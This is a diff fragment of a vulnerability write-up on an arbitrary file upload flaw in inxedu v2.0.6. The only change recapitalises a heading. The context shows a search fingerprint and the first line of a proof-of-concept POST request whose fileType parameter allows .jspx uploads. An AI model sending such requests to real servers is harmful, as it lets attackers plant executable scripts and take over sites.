@@ -8,7 +8,7 @@ inxedu v2.0.6组件controllerlmageUploadcontroller.class中的任意文件上传
 icon_hash="500708606"
 ```
 
-## poc
+## POC
 
 ```bash
 POST /image/gok4?&param=image&fileType=jpg,gif,png,jpeg,jspx&pressText=undefined HTTP/1.1
